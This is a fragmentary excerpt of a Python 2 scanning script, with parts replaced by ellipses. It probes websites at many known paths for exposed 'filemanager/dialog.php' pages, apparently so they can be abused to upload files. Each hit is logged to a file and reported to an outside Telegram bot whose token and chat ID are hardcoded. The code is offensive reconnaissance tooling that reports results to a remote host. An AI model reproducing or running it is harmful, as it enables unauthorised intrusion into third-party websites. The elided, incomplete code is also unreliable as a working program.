...
def send_message(chat_id, text):
    token = "2141746099:AAFm2p7Xbw1QeqTTc7wN0vSgU0tAf4kPg4Q"
    ...
    if response.status_code == 200:
        print "Pesan terkirim ke chatbot Telegram"
    else:
        print "Gagal mengirim pesan ke chatbot Telegram"
...
def jamet1(url):
    try:
        ...
        if '<input type="hidden" id="cur_dir" value="' in cek.text.encode('utf-8'):
            ...
            send_message("1921380937", "GET: {}".format(url+'/filemanager/dialog.php'))
        ...
        if '<input type="hidden" id="cur_dir" value="' in cek1.text.encode('utf-8'):
            ...
            send_message("1921380937", "GET: {}".format(url+'/admin/filemanager/dialog.php'))
        ...
        if '<input type="hidden" id="cur_dir" value="' in cek2.text.encode('utf-8'):
            ...
            send_message("1921380937", "GET: {}".format(url+'/assets/filemanager/dialog.php'))
        ...
        if '<input type="hidden" id="cur_dir" value="' in cek3.text.encode('utf-8'):
            ...
            send_message("1921380937", "GET: {}".format(url+'/plugins/filemanager/dialog.php'))
        ...
        if '<input type="hidden" id="cur_dir" value="' in cek4.text.encode('utf-8'):
            ...
            send_message("1921380937", "GET: {}".format(url+'/admin/js/tinymce/plugins/filemanager/dialog.php'))
        ...
        if '<input type="hidden" id="cur_dir" value="' in cek5.text.encode('utf-8'):
            ...
            send_message("1921380937", "GET: {}".format(url+'/js/filemanager/dialog.php'))
        ...
        if '<input type="hidden" id="cur_dir" value="' in cek6.text.encode('utf-8'):
            ...
            send_message("1921380937", "GET: {}".format(url+'/assets/js/tinymce/plugins/filemanager/dialog.php'))
        ...
        if '<input type="hidden" id="cur_dir" value="' in cek7.text.encode('utf-8'):
            ...
            send_message("1921380937", "GET: {}".format(url+'/assets/admin/js/tinymce/plugins/filemanager/dialog.php'))

        cek8 = requests.get(url+'/assets/admin/filemanager/dialog.php', verify=False, timeout=15)
        if '<input type="hidden" id="cur_dir" value="' in cek8.text.encode('utf-8'):
            print(ktngreen + '[Ok] Wp' + '(' + url + ')' + CEND)
            open('single.txt', 'a').write(url+'/assets/admin/filemanager/dialog.php'+'\n')
            send_message("1921380937", "GET: {}".format(url+'/assets/admin/filemanager/dialog.php'))
        ...
        if '<input type="hidden" id="cur_dir" value="' in cek9.text.encode('utf-8'):
            ...
            send_message("1921380937", "GET: {}".format(url+'/scripts/filemanager/dialog.php'))
        ...
        if '<input type="hidden" id="cur_dir" value="' in cek10.text.encode('utf-8'):
            ...
            send_message("1921380937", "GET: {}".format(url+'/js/tinymce/plugins/filemanager/dialog.php'))
        else:
